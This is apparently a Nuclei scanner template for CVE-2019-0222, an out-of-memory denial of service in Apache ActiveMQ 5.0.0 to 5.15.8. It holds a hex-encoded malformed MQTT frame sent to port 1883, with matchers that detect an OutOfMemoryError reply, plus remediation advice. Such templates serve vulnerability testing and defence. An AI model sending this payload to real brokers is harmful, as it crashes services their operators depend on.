id: CVE-2019-0222

info:
  name: Apache ActiveMQ MQTT Frame Unmarshalling DoS
  author: ProjectDiscoveryAI
  severity: high
  description: |
    In Apache ActiveMQ 5.0.0 - 5.15.8, unmarshalling a corrupt MQTT frame can lead to a broker Out of Memory exception, making it unresponsive.
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-0222
  remediation: |
    Upgrade Apache ActiveMQ to a version later than 5.15.8. Implement input validation and configure memory limits to prevent resource exhaustion.

tcp:
- inputs:
    - data: "00004e00014d5154540402003c000474657374000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
  host:
    - "{{Hostname}}"
  port: 1883
  read-size: 1024
  matchers-condition: and
  matchers:
    - type: word
      words:
        - "MQTT"
      part: data
    - type: word
      words:
        - "OutOfMemoryError"
      part: data